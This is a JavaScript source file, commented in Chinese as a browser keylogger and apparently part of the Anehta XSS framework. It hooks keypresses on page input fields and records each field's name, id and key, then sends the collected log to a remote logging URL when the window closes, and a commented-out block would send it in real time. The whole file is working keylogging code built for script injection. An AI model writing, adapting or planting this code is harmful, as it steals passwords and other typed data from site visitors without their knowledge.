//alert("keylog.js");
//////////////////////////////////////////////////////
//// 基于js的键盘记录器
//// Author: axis
//////////////////////////////////////////////////////

var tagName = new Array("input", "textarea");

//$("textarea").keydown(function(){ alert();});
var keylogger = new Array();
var i = 0; // 计数器
var j = 1; // 全局计数器

$(tagName[0]).keydown(function(event){
	/* 实时发送;通过控制i调整频率
	if ( i>=10 ){
		getURL(logurl+escape(keylogger));
		i = 0; // 重置计数器
	}
	*/
	// json data format
	keylogger[i] = "{tag:'"+tagName[0]+
	               "', name:'"+this.name+
	               "', id:'"+this.id+
	               "', press:'"+j+
	               "', key:'"+String.fromCharCode(event.keyCode)+
	               "', keyCode:'"+event.keyCode+
	               "'}";             
	//alert(keylogger);
	i=i+1;
	j=j+1
});

// 在窗口关闭时候发送keylog 到服务器
// 不稳定,如果是提交表单到其他页面的话,会post出错
$(window).unload(function(){
	anehta.net.getURL(logurl+escape(keylogger));
	//alert(keylogger);	
}
);

